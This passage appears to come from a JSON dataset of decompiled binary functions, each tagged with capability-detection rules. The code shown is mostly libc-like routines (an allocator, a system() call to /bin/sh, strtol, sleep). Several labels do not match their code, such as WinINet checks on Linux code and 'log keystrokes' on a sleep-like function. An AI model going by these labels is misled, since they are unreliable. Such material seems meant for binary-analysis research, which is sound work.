        "decompiled_code": "\nint64_t * fcn.00408928(uint64_t arg1)\n\n{\n    uint64_t *puVar1;\n    uint32_t *puVar2;\n    uint8_t uVar3;\n    ulong uVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    int64_t *piVar7;\n    int64_t iVar8;\n    uint64_t uVar9;\n    uint64_t uVar10;\n    uint32_t uVar11;\n    int64_t iVar12;\n    uint64_t uVar13;\n    uint64_t uVar14;\n    int64_t iVar15;\n    uint64_t uVar16;\n    uint64_t uVar17;\n    int64_t iVar18;\n    int64_t iVar19;\n    int64_t *piVar20;\n    uint64_t uVar21;\n    int64_t iVar22;\n    uint32_t uVar23;\n    uint32_t uVar24;\n    uint32_t uVar25;\n    uint64_t uVar26;\n    uint64_t uVar27;\n    bool bVar28;\n    uchar auVar29 [16];\n    uchar auStack88 [40];\n    \n    fcn.0040a6b1(auStack88, fcn.0040a6ae, 0x50f2c0);\n    fcn.0040a6ae();\n    uVar3 = *0x511880;\n    if (0xffffffffffffffbf < arg1) {\n        puVar6 = fcn.00406f98();\n        *puVar6 = 0xc;\n        return NULL;\n    }\n    uVar9 = 0x20;\n    if (0x1f < arg1 + 0x17) {\n        uVar9 = arg1 + 0x17 & 0xfffffffffffffff0;\n    }\n    if ((*0x511880 & 1) == 0) {\n        if (CONCAT71(*0x511881, *0x511880) == 0) {\n            fcn.0040967d(0x511880);\n        }\ncode_r0x00408cfd:\n        uVar13 = *(*0x5118e0 + 8) & 0xfffffffffffffffc;\n        if (uVar9 + 0x20 <= uVar13) {\ncode_r0x004090d8:\n            uVar17 = *0x5118e0 + uVar9;\n            piVar7 = *0x5118e0 + 0x10;\n            puVar1 = *0x5118e0 + 8;\n            *0x5118e0 = uVar17;\n            *puVar1 = uVar9 | 1;\n            *(uVar17 + 8) = uVar13 - uVar9 | 1;\n            goto code_r0x0040916c;\n        }\n        if ((*0x511880 & 2) != 0) {\n            fcn.0040967d(0x511880);\n            piVar7 = fcn.00408928(uVar9 - 0xf);\n            goto code_r0x0040916c;\n        }\n        uVar13 = *0x511f24 - 1;\n        if ((((uVar9 < *0x511f10) || (*0x511f1c <= *0x511f18)) ||\n            (uVar17 = uVar13 + 0x17 + uVar9 & ~uVar13,  uVar17 <= uVar9)) ||\n           (piVar7 = fcn.0040aa14(0, uVar17, 3, 0x22, 0),  piVar7 == 0xffffffffffffffff)) {\n            uVar17 = *0x5118e0;\n            iVar8 = uVar9 + 0x20 + *0x511f08;\n            uVar27 = *(*0x5118e0 + 8) & 0xfffffffffffffffc;\n            if ((*0x511f28 & 1) != 0) {\n                iVar8 = iVar8 - uVar27;\n            }\n            uVar16 = ~uVar13;\n            uVar26 = uVar16 & iVar8 + uVar13;\n            if (uVar26 < 1) {\ncode_r0x00408ea6:\n                if ((*0x511f28 & 1) != 0) {\n                    uVar26 = uVar26 + uVar13 + uVar27 & uVar16;\n                }\n                if (uVar26 < 0x100000) {\n                    uVar26 = 0x100000;\n                }\n                if ((uVar9 < uVar26) && (uVar10 = fcn.0040aa14(0, uVar26, 3, 0x22, 0),  uVar10 != 0xffffffffffffffff)) {\n                    *0x511f28 = *0x511f28 & 0xfffffffe;\n                    uVar14 = uVar10 + uVar26;\n                    goto code_r0x00408f07;\n                }\n            }\n            else {\n                uVar10 = fcn.0040ae0c(uVar26);\n                uVar14 = 0xffffffffffffffff;\n                if (uVar10 == 0xffffffffffffffff) goto code_r0x00408ea6;\ncode_r0x00408f07:\n                if (uVar10 != 0xffffffffffffffff) {\n                    *0x511f38 = *0x511f38 + uVar26;\n                    uVar21 = uVar17 + uVar27;\n                    if (uVar14 == 0xffffffffffffffff && uVar10 == uVar21) {\n                        *(uVar17 + 8) = uVar26 + uVar27 | 1;\n                    }\n                    else {\n                        if (((*0x511f28 & uVar27 != 0) != 0) && (uVar10 < uVar21)) {\n                            *0x511f28 = *0x511f28 & 0xfffffffe;\n                        }\n                        if ((*0x511f28 & 1) == 0) {\n                            iVar8 = 0;\n                            if (uVar14 == 0xffffffffffffffff) {\n                                uVar14 = fcn.0040ae0c(0);\n                                *0x511f38 = *0x511f38 + ((uVar14 - uVar10) - uVar26);\n                                iVar8 = 0;\n                            }\n                        }\n                        else {\n                            if (uVar27 != 0) {\n                                *0x511f38 = *0x511f38 + (uVar10 - uVar21);\n                            }\n                            iVar8 = 0;\n                            uVar21 = uVar10;\n                            if ((uVar10 & 0xf) != 0) {\n                                iVar8 = 0x10 - (uVar10 & 0xf);\n                                uVar21 = uVar10 + iVar8;\n                            }\n                            uVar26 = uVar10 + uVar26;\n                            iVar12 = uVar26 + iVar8 + uVar27;\n                            iVar8 = iVar8 + uVar27 + ((iVar12 + uVar13 & uVar16) - iVar12);\n                            uVar14 = fcn.0040ae0c(iVar8);\n                            if (uVar14 == 0xffffffffffffffff) {\n                                uVar26 = fcn.0040ae0c(0);\n                            }\n                            else {\n                                bVar28 = uVar10 <= uVar14;\n                                uVar10 = uVar21;\n                                if (bVar28) goto code_r0x00409004;\n                                *0x511f28 = *0x511f28 & 0xfffffffe;\n                            }\n                            uVar14 = uVar26;\n                            iVar8 = 0;\n                            uVar10 = uVar21;\n                        }\ncode_r0x00409004:\n                        if (uVar14 != 0xffffffffffffffff) {\n                            *0x5118e0 = uVar10;\n                            *(uVar10 + 8) = (uVar14 - uVar10) + iVar8 | 1;\n                            *0x511f38 = *0x511f38 + iVar8;\n                            if (uVar27 != 0) {\n                                uVar13 = uVar27 - 0x18 & 0xfffffffffffffff0;\n                                *(uVar17 + 8) = uVar13 | 1;\n                                *(uVar17 + 8 + uVar13) = 9;\n                                *(uVar17 + 0x10 + uVar13) = 9;\n                                uVar4 = *0x511f00;\n                                *0x511f00 = uVar4;\n                                if (0x1f < uVar13) {\n                                    *0x511f00 = 0xffffffffffffffff;\n                                    fcn.00409817(uVar17 + 0x10);\n                                    *0x511f00 = uVar4;\n                                }\n                            }\n                        }\n                    }\n                    if (*0x511f40 < *0x511f38) {\n                        *0x511f40 = *0x511f38;\n                    }\n                    uVar17 = *0x511f38 + *0x511f30;\n                    if (*0x511f38 + *0x511f30 <= *0x511f50) {\n                        uVar17 = *0x511f50;\n                    }\n                    uVar13 = *(*0x5118e0 + 8) & 0xfffffffffffffffc;\n                    *0x511f50 = uVar17;\n                    if (uVar9 + 0x20 <= uVar13) goto code_r0x004090d8;\n                }\n            }\n            puVar6 = fcn.00406f98();\n            piVar7 = NULL;\n            *puVar6 = 0xc;\n            goto code_r0x0040916c;\n        }\n        if ((piVar7 & 0xf) == 0) {\n            *piVar7 = 0;\n            uVar9 = uVar17;\n        }\n        else {\n            iVar8 = 0x10 - (piVar7 & 0xf);\n            piVar7 = piVar7 + iVar8;\n            *piVar7 = iVar8;\n            uVar9 = uVar17 - iVar8;\n        }\n        piVar7[1] = uVar9 | 2;\n        *0x511f18 = *0x511f18 + 1;\n        iVar5 = *0x511f18;\n        if (*0x511f18 <= *0x511f20) {\n            iVar5 = *0x511f20;\n        }\n        *0x511f30 = *0x511f30 + uVar17;\n        if (*0x511f48 < *0x511f30) {\n            *0x511f48 = *0x511f30;\n        }\n        *0x511f20 = iVar5;\n        uVar9 = *0x511f30 + *0x511f38;\n        if (*0x511f30 + *0x511f38 <= *0x511f50) {\n            uVar9 = *0x511f50;\n        }\n    }\n    else {\n        if (uVar9 <= CONCAT71(*0x511881, *0x511880)) {\n            iVar8 = (((uVar9 & 0xffffffff) >> 3) - 2) * 8;\n            iVar12 = *(iVar8 + 0x511888);\n            if (iVar12 == 0) goto code_r0x004089d5;\n            *(iVar8 + 0x511888) = *(iVar12 + 0x10);\ncode_r0x00408a12:\n            piVar7 = iVar12 + 0x10;\n            goto code_r0x0040916c;\n        }\ncode_r0x004089d5:\n        if (uVar9 < 0x100) {\n            uVar13 = (uVar9 & 0xffffffff) >> 3;\n            iVar8 = uVar13 * 2 * 8;\n            iVar12 = *(iVar8 + 0x5118f8);\n            if (iVar12 != iVar8 + 0x5118e0) {\n                iVar15 = *(iVar12 + 0x18);\n                puVar1 = iVar12 + 8 + uVar9;\n                *puVar1 = *puVar1 | 1;\n                *(iVar8 + 0x5118f8) = iVar15;\n                *(iVar15 + 0x10) = iVar8 + 0x5118e0;\n                goto code_r0x00408a12;\n            }\n        }\n        else {\n            uVar11 = fcn.004088c8(uVar9 & 0xffffffff);\n            uVar13 = uVar11;\n            if ((uVar3 & 2) != 0) {\n                fcn.0040967d(0x511880);\n            }\n        }\n        while (iVar8 = *0x511908,  *0x511908 != 0x5118f0) {\n            uVar17 = *(*0x511908 + 8);\n            iVar12 = *(*0x511908 + 0x18);\n            uVar27 = uVar17 & 0xfffffffffffffffc;\n            if ((((uVar9 < 0x100) && (iVar12 == 0x5118f0)) && (*0x511908 == *0x5118e8)) && (uVar9 + 0x20 < uVar27)) {\n                iVar12 = *0x511908 + uVar9;\n                uVar27 = uVar27 - uVar9;\n                puVar1 = *0x511908 + 8;\n                *0x5118e8 = iVar12;\n                *0x511900 = iVar12;\n                *0x511908 = iVar12;\n                *puVar1 = uVar9 | 1;\n                *(iVar12 + 0x10) = 0x5118f0;\n                *(iVar12 + 0x18) = 0x5118f0;\n                *(iVar12 + 8) = uVar27 | 1;\n                *(iVar12 + uVar27) = uVar27;\ncode_r0x0040914e:\n                piVar7 = iVar8 + 0x10;\n                goto code_r0x0040916c;\n            }\n            *0x511908 = iVar12;\n            *(iVar12 + 0x10) = 0x5118f0;\n            if (uVar27 == uVar9) {\n                puVar1 = iVar8 + 8 + uVar9;\n                *puVar1 = *puVar1 | 1;\n                goto code_r0x0040914e;\n            }\n            if (uVar27 < 0x100) {\n                iVar5 = (uVar17 & 0xfffffffc) >> 3;\n                iVar12 = iVar5 * 2 * 8;\n                iVar19 = *(iVar12 + 0x5118f0);\n                iVar22 = iVar12 + 0x5118e0;\n            }\n            else {\n                iVar5 = fcn.004088c8(uVar17 & 0xfffffffc);\n                iVar12 = iVar5 * 2 * 8;\n                iVar15 = iVar12 + 0x5118e0;\n                iVar18 = *(iVar12 + 0x5118f0);\n                iVar19 = iVar18;\n                iVar22 = iVar15;\n                if ((iVar18 != iVar15) && (iVar22 = *(iVar12 + 0x5118f8),  iVar19 = iVar15,  *(iVar22 + 8) <= uVar27)) {\n                    for (; (uVar27 | 1) < *(iVar18 + 8); iVar18 = *(iVar18 + 0x10)) {\n                    }\n                    iVar22 = *(iVar18 + 0x18);\n                    iVar19 = iVar18;\n                }\n            }\n            puVar2 = (iVar5 >> 5) * 4 + 0x511ef0;\n            *puVar2 = *puVar2 | 1 << (iVar5 & 0x1f);\n            *(iVar8 + 0x18) = iVar22;\n            *(iVar8 + 0x10) = iVar19;\n            *(iVar19 + 0x18) = iVar8;\n            *(iVar22 + 0x10) = iVar8;\n        }\n        if (0xff < uVar9) {\n            iVar8 = uVar13 * 2 * 8;\n            iVar12 = *(iVar8 + 0x5118f8);\n            do {\n                iVar15 = iVar12;\n                if (iVar15 == iVar8 + 0x5118e0) goto code_r0x00408bdf;\n                iVar12 = *(iVar15 + 0x18);\n                uVar17 = *(iVar15 + 8) & 0xfffffffffffffffc;\n            } while (uVar17 < uVar9);\n            auVar29 = CONCAT88(*(iVar15 + 0x10), iVar15);\n            if ((*(*(iVar15 + 0x10) + 0x18) != iVar15) || (*(iVar12 + 0x10) != iVar15)) {\n                auVar29 = fcn.004099f8();\n            }\n            iVar15 = SUB168(auVar29 >> 0x40, 0);\n            iVar8 = SUB168(auVar29, 0);\n            *(iVar15 + 0x18) = iVar12;\n            *(iVar12 + 0x10) = iVar15;\n            uVar13 = uVar17 - uVar9;\n            piVar7 = iVar8 + 0x10;\n            if (uVar13 < 0x20) {\n                puVar1 = iVar8 + 8 + uVar17;\n                *puVar1 = *puVar1 | 1;\n            }\n            else {\n                iVar12 = iVar8 + uVar9;\n                *(iVar8 + 8) = uVar9 | 1;\n                *0x511900 = iVar12;\n                *0x511908 = iVar12;\n                *(iVar12 + 0x10) = 0x5118f0;\n                *(iVar12 + 0x18) = 0x5118f0;\n                *(iVar12 + 8) = uVar13 | 1;\n                *(iVar12 + uVar13) = uVar13;\n            }\n            goto code_r0x0040916c;\n        }\ncode_r0x00408bdf:\n        uVar11 = uVar13 + 1;\n        uVar25 = uVar11 >> 5;\n        uVar23 = 1 << (uVar11 & 0x1f);\n        piVar20 = uVar11 * 2 * 8 + 0x5118e0;\n        uVar11 = *(uVar25 * 4 + 0x511ef0);\n        while( true ) {\n            uVar24 = uVar23;\n            if (uVar11 < uVar23 || uVar23 == 0) {\n                do {\n                    uVar25 = uVar25 + 1;\n                    if (2 < uVar25) goto code_r0x00408cfd;\n                    uVar11 = *(uVar25 * 4 + 0x511ef0);\n                } while (uVar11 == 0);\n                uVar24 = 1;\n                piVar20 = uVar25 * 0x40 * 8 + 0x5118e0;\n            }\n            for (; (uVar11 & uVar24) == 0; uVar24 = uVar24 * 2) {\n                piVar20 = piVar20 + 2;\n            }\n            piVar7 = piVar20[3];\n            if (piVar7 != piVar20) break;\n            piVar20 = piVar7 + 2;\n            uVar23 = uVar24 * 2;\n            uVar11 = uVar11 & ~uVar24;\n            *(uVar25 * 4 + 0x511ef0) = uVar11;\n        }\n        uVar13 = piVar7[1];\n        iVar8 = piVar7[3];\n        piVar20[3] = iVar8;\n        *(iVar8 + 0x10) = piVar20;\n        uVar17 = (uVar13 & 0xfffffffffffffffc) - uVar9;\n        if (uVar17 < 0x20) {\n            puVar1 = piVar7 + (uVar13 & 0xfffffffffffffffc) + 8;\n            *puVar1 = *puVar1 | 1;\n            uVar9 = *0x511f50;\n        }\n        else {\n            iVar8 = piVar7 + uVar9;\n            *0x511900 = iVar8;\n            *0x511908 = iVar8;\n            *(iVar8 + 0x10) = 0x5118f0;\n            *(iVar8 + 0x18) = 0x5118f0;\n            if (uVar9 < 0x100) {\n                *0x5118e8 = iVar8;\n            }\n            piVar7[1] = uVar9 | 1;\n            *(iVar8 + uVar17) = uVar17;\n            *(iVar8 + 8) = uVar17 | 1;\n            uVar9 = *0x511f50;\n        }\n    }\n    *0x511f50 = uVar9;\n    piVar7 = piVar7 + 2;\ncode_r0x0040916c:\n    fcn.0040a6b1(auStack88, 1);\n    return piVar7;\n}\n",
        "token_count": 4756
    },
    "004099f8": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.004099f8(void)\n\n{\n    int32_t iVar1;\n    ulong uStack296;\n    ulong auStack288 [16];\n    uint uStack160;\n    ulong auStack136 [16];\n    \n    fcn.0040a6ae(0x50f300);\n    iVar1 = 0x10;\n    while (iVar1 = iVar1 + -1,  -1 < iVar1) {\n        auStack136[iVar1] = 0;\n    }\n    iVar1 = fcn.0040bdd4(auStack136, 6);\n    if (iVar1 == 0) {\n        fcn.0040ae58(1, auStack136, 0);\n    }\n    if (*0x511568 != 0) goto code_r0x00409a7d;\n    *0x511568 = 1;\n    while( true ) {\n        fcn.0040a6ae(0x50f300);\n        fcn.0040bcf8(6);\n        fcn.0040a6ae(0x50f300);\ncode_r0x00409a7d:\n        if (*0x511568 != 1) break;\n        *0x511568 = 2;\n        fcn.00408200(&uStack296, 0, 0x98);\n        iVar1 = 0x10;\n        uStack296 = 0;\n        while (iVar1 = iVar1 + -1,  -1 < iVar1) {\n            auStack288[iVar1] = 0xffffffffffffffff;\n        }\n        uStack160 = 0;\n        fcn.0040a91d(6, &uStack296, 0);\n    }\n    if (*0x511568 != 2) {\n        if (*0x511568 == 3) {\n            *0x511568 = 4;\n            fcn.004068f8(0x7f);\n        }\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    do {\n    // WARNING: Do nothing block with infinite loop\n    } while( true );\n}\n",
        "token_count": 465
    },
    "00409d20": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.00409d20(uint32_t **arg1, uint32_t *arg2)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    uint32_t *puVar5;\n    uint32_t *puVar6;\n    \n    puVar1 = arg1[2];\n    if (*(arg1 + 3) == 0) {\n        uVar3 = *puVar1 * 0x41c64e6d + 0x3039 & 0x7fffffff;\n        *puVar1 = uVar3;\n        *arg2 = uVar3;\n    }\n    else {\n        puVar6 = *arg1;\n        puVar4 = arg1[1];\n        puVar2 = arg1[5];\n        *puVar6 = *puVar6 + *puVar4;\n        puVar5 = puVar6 + 1;\n        *arg2 = *puVar6 >> 1;\n        puVar4 = puVar4 + 1;\n        puVar6 = puVar1;\n        if ((puVar5 < puVar2) && (puVar6 = puVar5,  puVar2 <= puVar4)) {\n            puVar4 = puVar1;\n        }\n        *arg1 = puVar6;\n        arg1[1] = puVar4;\n    }\n    return 0;\n}\n",
        "token_count": 319
    },
    "00409edc": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00409edc(int64_t arg1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    ulong arg2;\n    ulong arg2_00;\n    ulong arg2_01;\n    ulong in_R9;\n    int32_t iStack12;\n    \n    iVar2 = 1;\n    if (arg1 != 0) {\n        arg2 = fcn.0040bd0c(3, 1);\n        arg2_00 = fcn.0040bd0c(2, 1);\n        arg2_01 = fcn.0040bd0c(0x11, 0);\n        uVar1 = fcn.0040aa44();\n        if (uVar1 < 0) {\n            fcn.0040bd0c(3, arg2);\n            fcn.0040bd0c(2, arg2_00);\n            fcn.0040bd0c(0x11, arg2_01);\n            iVar2 = -1;\n        }\n        else {\n            if (uVar1 == 0) {\n                fcn.0040bd0c(3, 0);\n                fcn.0040bd0c(2, 0);\n                fcn.0040bd0c(0x11, 0);\n                fcn.0040a214(\"/bin/sh\", \"sh\", 0x40dbe8, arg1, 0, in_R9);\n                fcn.004068f8(0x7f);\n            }\n            fcn.0040bd0c(3, 1);\n            fcn.0040bd0c(2, 1);\n            iVar2 = fcn.0040af00(uVar1, &iStack12, 0, 0);\n            if (iVar2 != -1) {\n                iVar2 = iStack12;\n            }\n            iStack12 = iVar2;\n            fcn.0040bd0c(3, arg2);\n            fcn.0040bd0c(2, arg2_00);\n            fcn.0040bd0c(0x11, arg2_01);\n            iVar2 = iStack12;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 490
    },
    "0040a040": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n\nuint64_t fcn.0040a040(uint8_t *arg1, uint8_t **arg2, ulong arg3)\n\n{\n    uchar auVar1 [16];\n    bool bVar2;\n    uint8_t uVar3;\n    uint64_t uVar4;\n    uint *puVar5;\n    uint8_t uVar6;\n    uint8_t *puVar7;\n    uint8_t *puVar8;\n    uint32_t uVar9;\n    uint64_t uVar10;\n    uint64_t uVar11;\n    ulong var_2h;\n    \n    puVar7 = arg1;\n    while (uVar6 = *puVar7,  (*(*0x50f478 + uVar6 * 2) & 0x20) != 0) {\n        puVar7 = puVar7 + 1;\n    }\n    if (uVar6 == 0x2b) {\n        bVar2 = false;\n    }\n    else {\n        bVar2 = false;\n        if (uVar6 != 0x2d) goto code_r0x0040a0a1;\n        bVar2 = true;\n    }\n    puVar7 = puVar7 + 1;\ncode_r0x0040a0a1:\n    puVar8 = puVar7;\n    uVar9 = arg3;\n    if ((arg3 & 0xffffffef) == 0) {\n        uVar9 = arg3 + 10;\n        if (*puVar7 == 0x30) {\n            arg1 = puVar7 + 1;\n            uVar9 = arg3 + 8;\n            puVar8 = arg1;\n            if ((*arg1 | 0x20) == 0x78) {\n                uVar9 = uVar9 * 2;\n                puVar8 = puVar7 + 2;\n            }\n        }\n        if (0x10 < uVar9) {\n            uVar9 = 0x10;\n        }\n    }\n    uVar10 = 0;\n    if (uVar9 - 2 < 0x23) {\n        uVar11 = uVar9;\n        auVar1 = ZEXT816(0) << 0x40 | ZEXT816(0xffffffffffffffff);\n        uVar4 = SUB168(auVar1 / ZEXT816(uVar11), 0);\n        while( true ) {\n            uVar6 = *puVar8 - 0x30;\n            if (9 < uVar6) {\n                uVar3 = *puVar8 | 0x20;\n                uVar6 = 0x28;\n                if (0x60 < uVar3) {\n                    uVar6 = uVar3 + 0xa9;\n                }\n            }\n            if (uVar9 <= uVar6) break;\n            puVar8 = puVar8 + 1;\n            arg1 = puVar8;\n            if ((uVar4 < uVar10) || (SUB161(auVar1 % ZEXT816(uVar11), 0) < uVar6 && uVar10 == uVar4)) {\n                puVar5 = fcn.00406f98();\n                uVar10 = 0xffffffffffffffff;\n                *puVar5 = 0x22;\n            }\n            else {\n                uVar10 = uVar10 * uVar11 + uVar6;\n            }\n        }\n    }\n    if (arg2 != NULL) {\n        *arg2 = arg1;\n    }\n    if (0x8000000000000000 - !bVar2 < uVar10) {\n        puVar5 = fcn.00406f98();\n        *puVar5 = 0x22;\n        uVar10 = 0x8000000000000000 - !bVar2;\n    }\n    if (bVar2) {\n        uVar10 = -uVar10;\n    }\n    return uVar10;\n}\n",
        "token_count": 870
    },
    "0040a214": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040a214(ulong noname_0, ulong arg2, ulong arg3, ulong arg4, ulong arg5, ulong arg6)\n\n{\n    ulong *puVar1;\n    int64_t iVar2;\n    ulong *puVar3;\n    uint64_t uVar4;\n    int64_t *piVar5;\n    ulong *puVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    ulong var_10h;\n    ulong uStack224;\n    ulong var_d0h;\n    int64_t *var_c8h;\n    ulong *var_c0h;\n    ulong var_b0h;\n    ulong var_a0h;\n    ulong var_98h;\n    ulong var_90h;\n    ulong var_88h;\n    \n    var_c8h = &fcn.0040a214::var_10h;\n    var_98h = arg4;\n    var_90h = arg5;\n    var_a0h = arg3;\n    var_88h = arg6;\n    var_d0h._0_4_ = 0x10;\n    iVar8 = 0;\n    do {\n        iVar7 = iVar8;\n        iVar8 = iVar7 + 1;\n        if (var_d0h < 0x30) {\n            uVar4 = var_d0h;\n            var_d0h._0_4_ = var_d0h + 8;\n            piVar5 = &fcn.0040a214::var_b0h + uVar4;\n        }\n        else {\n            piVar5 = var_c8h;\n            var_c8h = var_c8h + 1;\n        }\n    } while (*piVar5 != 0);\n    iVar2 = -((iVar7 + 2) * 8 + 0x1eU & 0xfffffffffffffff0);\n    puVar1 = &fcn.0040a214::var_c8h + iVar2;\n    *puVar1 = arg2;\n    var_c8h = &fcn.0040a214::var_10h;\n    var_d0h._0_4_ = 0x10;\n    var_c0h = &fcn.0040a214::var_b0h;\n    puVar3 = puVar1;\n    do {\n        puVar6 = var_c8h;\n        puVar3 = puVar3 + 1;\n        if (var_d0h < 0x30) {\n            puVar6 = var_d0h + &fcn.0040a214::var_b0h;\n            var_d0h._0_4_ = var_d0h + 8;\n        }\n        else {\n            var_c8h = var_c8h + 1;\n        }\n        iVar8 = iVar8 + -1;\n        *puVar3 = *puVar6;\n    } while (iVar8 != 0);\n    *(&stack0xffffffffffffff20 + iVar2) = 0x40a331;\n    fcn.0040aa88(noname_0, puVar1, *0x511580);\n    return;\n}\n",
        "token_count": 687
    },
    "0040a334": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0040a334(ulong arg1)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int64_t aiStack472 [20];\n    uchar auStack312 [128];\n    ulong auStack184 [16];\n    uint64_t uStack56;\n    int64_t iStack48;\n    \n    iVar3 = 0x10;\n    if (arg1 == 0) {\ncode_r0x0040a4be:\n        iVar3 = 0;\n    }\n    else {\n        while (iVar3 = iVar3 + -1,  -1 < iVar3) {\n            auStack184[iVar3] = 0;\n        }\n        uStack56 = arg1;\n        iStack48 = 0;\n        iVar3 = fcn.0040bdd4(auStack184, 0x11);\n        if (-1 < iVar3) {\n            iVar3 = fcn.0040ae58(0, auStack184, auStack312);\n            if (iVar3 == 0) {\n                iVar3 = fcn.0040bdb4(auStack312, 0x11);\n                iVar4 = 0x10;\n                if (iVar3 != 0) {\ncode_r0x0040a499:\n                    iVar3 = fcn.0040adbc(&uStack56, &uStack56);\ncode_r0x0040a4a0:\n                    if (iVar3 != 0) {\n                        return (499999999 < iStack48) + uStack56;\n                    }\n                    goto code_r0x0040a4be;\n                }\n                while (iVar4 = iVar4 + -1,  -1 < iVar4) {\n                    auStack184[iVar4] = 0;\n                }\n                iVar3 = fcn.0040bdd4(auStack184, 0x11);\n                if (-1 < iVar3) {\n                    iVar3 = fcn.0040a91d(0x11, 0, aiStack472);\n                    if (-1 < iVar3) {\n                        if (aiStack472[0] != 1) {\n                            fcn.0040ae58(2, auStack312, 0);\n                            goto code_r0x0040a499;\n                        }\n                        iVar3 = fcn.0040adbc(&uStack56, &uStack56);\n                        puVar2 = fcn.00406f98();\n                        uVar1 = *puVar2;\n                        fcn.0040ae58(2, auStack312, 0);\n                        *puVar2 = uVar1;\n                        goto code_r0x0040a4a0;\n                    }\n                    puVar2 = fcn.00406f98();\n                    uVar1 = *puVar2;\n                    fcn.0040ae58(2, auStack312, 0);\n                    *puVar2 = uVar1;\n                }\n            }\n        }\n        iVar3 = -1;\n    }\n    return iVar3;\n}\n",
        "token_count": 672
    },
    "0040a6e7": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040a713)\n\nulong fcn.0040a6e7(void)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int16_t iVar4;\n    uint *puVar5;\n    ulong in_RAX;\n    ulong uStack40;\n    \n    if (*0x5115a0 != 0) {\n        return in_RAX;\n    }\n    *0x5115a0 = 1;\n    *0x511588 = 0x1000;\n    puVar5 = fcn.00406f98();\n    uVar2 = *0x50f140;\n    uVar1 = *puVar5;\n    iVar4 = fcn.00408630(0);\n    uVar3 = *0x50f1c0;\n    *0x50f140 = *0x50f140 & 0xffff0000 | uVar2 ^ (1 - iVar4) * 0x100;\n    iVar4 = fcn.00408630(1);\n    *0x50f1c0 = *0x50f1c0 & 0xffff0000 | uVar3 ^ (1 - iVar4) * 0x100;\n    *puVar5 = uVar1;\n    return uStack40;\n}\n",
        "token_count": 296
    },
    "0040a72a": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040a8f1)\n// WARNING: Removing unreachable block (ram,0x0040a898)\n// WARNING: Removing unreachable block (ram,0x0040a8c3)\n// WARNING: Removing unreachable block (ram,0x0040a9b3)\n\nuint fcn.0040a72a(code *arg1, ulong arg2, uint64_t **arg3, code *arg4, ulong arg5, ulong arg6)\n\n{\n    uint64_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint64_t *arg2_00;\n    uint *puVar5;\n    ulong arg3_00;\n    ulong extraout_RDX;\n    ulong extraout_RDX_00;\n    ulong arg3_01;\n    ulong arg3_02;\n    ulong *extraout_RDX_01;\n    uint64_t **ppuVar6;\n    ulong in_stack_00000008;\n    ulong uStack656;\n    uint uStack648;\n    ulong uStack640;\n    uchar auStack632 [136];\n    uint64_t *puStack496;\n    int64_t iStack488;\n    ulong uStack480;\n    uchar auStack472 [144];\n    ulong uStack328;\n    ulong uStack320;\n    uint64_t **ppuStack312;\n    code *pcStack304;\n    uchar auStack296 [104];\n    int64_t iStack192;\n    int64_t iStack112;\n    int64_t iStack96;\n    int64_t iStack80;\n    int64_t iStack64;\n    \n    *0x511578 = in_stack_00000008;\n    *0x511580 = arg3 + arg2;\n    if (*0x511580 + 1 != *arg3) {\n        *0x511580 = *0x511580 + 1;\n    }\n    pcStack304 = 0x40a790;\n    *0x511598 = arg6;\n    fcn.00408200(&stack0xfffffffffffffed8, 0, 0xf0);\n    arg2_00 = *0x511580;\n    do {\n        uVar1 = *arg2_00;\n        